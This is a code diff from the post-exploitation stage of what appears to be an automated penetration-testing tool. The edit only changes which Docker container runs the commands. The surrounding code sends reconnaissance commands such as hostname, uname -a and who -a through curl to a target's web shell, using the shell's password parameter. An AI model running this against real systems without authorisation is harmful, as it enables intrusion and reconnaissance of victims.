@@ -335,7 +335,7 @@ def _action_post_exploit(task_id, target, params, state):
                 for cmd in ["hostname", "cat /etc/os-release 2>/dev/null | head -3", "who -a 2>/dev/null | head -10", "uname -a"]:
                     cmd_url = f"{ws_url}?{ws_pass}={_sp.quote(cmd)}"
                     try:
-                        r = _sp.run(["docker", "exec", "yunjing-sbx", "curl", "-s",
+                        r = _sp.run(["docker", "exec", "yunjing-kali", "curl", "-s",
                                      "--connect-timeout", "5", cmd_url],
                                     timeout=15, capture_output=True, text=True)
                         if r.stdout.strip():
